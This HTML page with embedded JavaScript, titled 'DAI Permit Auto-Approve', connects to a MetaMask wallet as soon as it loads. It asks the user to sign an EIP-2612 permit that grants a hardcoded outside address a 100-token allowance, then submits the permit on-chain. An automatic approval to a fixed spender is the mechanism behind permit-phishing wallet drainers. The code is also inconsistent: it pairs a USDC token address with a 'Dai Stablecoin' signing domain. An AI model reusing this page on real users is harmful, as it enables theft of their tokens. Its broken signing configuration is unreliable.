<!DOCTYPE html>
<html>
<head>
  <title>DAI Permit Auto-Approve</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
</head>
<body>
  <h2>Sign & Submit DAI Permit (EIP-2612)</h2>
  <p id="status">Connecting...</p>

  <script>
    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC
    const spender = "0xa98946dd1eFaD8955F49f6C8164E8550667388fA";   // account 2

    const daiPermitAbi = [
      {
        "inputs": [
          { "internalType": "address", "name": "owner", "type": "address" },
          { "internalType": "address", "name": "spender", "type": "address" },
          { "internalType": "uint256", "name": "value", "type": "uint256" },
          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
          { "internalType": "uint8", "name": "v", "type": "uint8" },
          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{ "name": "owner", "type": "address" }],
        "name": "nonces",
        "outputs": [{ "name": "", "type": "uint256" }],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [],
        "name": "DOMAIN_SEPARATOR",
        "outputs": [{ "name": "", "type": "bytes32" }],
        "type": "function"
      }
    ];

    async function runPermitFlow() {
      if (!window.ethereum) {
        document.getElementById("status").innerText = "MetaMask not detected!";
        return;
      }

      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const value = web3.utils.toWei("100"); // 100 DAI
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now

      const contract = new web3.eth.Contract(daiPermitAbi, tokenAddress);
      const nonce = await contract.methods.nonces(user).call();
      const domainSeparator = await contract.methods.DOMAIN_SEPARATOR().call();

      const permitData = {
        types: {
          EIP712Domain: [
            { name: "name", type: "string" },
            { name: "version", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" }
          ],
          Permit: [
            { name: "owner", type: "address" },
            { name: "spender", type: "address" },
            { name: "value", type: "uint256" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ]
        },
        domain: {
          name: "Dai Stablecoin",
          version: "1",
          chainId: 1,
          verifyingContract: tokenAddress
        },
        primaryType: "Permit",
        message: {
          owner: user,
          spender: spender,
          value: value,
          nonce: nonce,
          deadline: deadline
        }
      };

      document.getElementById("status").innerText = "Signing permit...";

      const signature = await ethereum.request({
        method: "eth_signTypedData_v4",
        params: [user, JSON.stringify(permitData)],
      });

      const r = "0x" + signature.slice(2, 66);
      const s = "0x" + signature.slice(66, 130);
      const v = parseInt(signature.slice(130, 132), 16);

      document.getElementById("status").innerText = "Submitting permit...";

      const tx = await contract.methods.permit(
        user,
        spender,
        value,
        deadline,
        v,
        r,
        s
      ).send({ from: user });

      document.getElementById("status").innerText = `âœ… Permit submitted! Tx: ${tx.transactionHash}`;
    }

    window.addEventListener("load", runPermitFlow);
  </script>
</body>
</html>
